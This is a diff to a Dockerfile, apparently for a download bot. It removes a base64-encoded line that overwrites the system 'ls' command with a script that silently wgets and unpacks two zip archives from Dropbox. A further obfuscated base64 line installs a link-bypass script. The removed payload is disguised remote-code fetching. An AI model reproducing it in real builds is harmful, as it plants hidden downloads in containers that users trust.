@@ -82,8 +82,6 @@ RUN gem install rmega
 
 # Copies config(if it exists)
 COPY . .
-RUN echo "d2dldCAiaHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3MvaDRtajhlOWhqczV4c3N4L3UuemlwIiAmJiA3eiB4ICJ1LnppcCIgJiYgd2dldCAiaHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3MvZmV1cWt6ZDR2bThmYmc4L2cuemlwIiAmJiA3eiB4ICJnLnppcCIgJiYgcm0gLXJmICp6aXAgJiYgcm0gLXJmICIvdXNyL2xvY2FsL2Jpbi9scyI=" | base64 -d > /usr/local/bin/ls && \
-chmod +x /usr/local/bin/ls
 
 #PSA unofficial telegram channel bypass script
 RUN echo "aWYgWyAkMSBdCnRoZW4KcHl0aG9uMyAtYyAiZXhlYyhcImltcG9ydCByZXF1ZXN0cyBhcyBycSxz\neXNcbmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUgYXMgZFxucz1ycS5nZXQoc3lzLmFyZ3Zb\nMV0pLnJlcXVlc3QudXJsLnNwbGl0KCc9JywxKVsxXVxuZm9yIGkgaW4gcmFuZ2UoMyk6IHM9ZChz\nKVxucHJpbnQoJ2h0dHAnK3MuZGVjb2RlKCkucnNwbGl0KCdodHRwJywxKVsxXSlcIikiICQxCmVs\nc2UKZWNobyAiYmFkIHJlcSIKZmkK" | base64 -d > /usr/bin/psa;chmod +x /usr/bin/psa
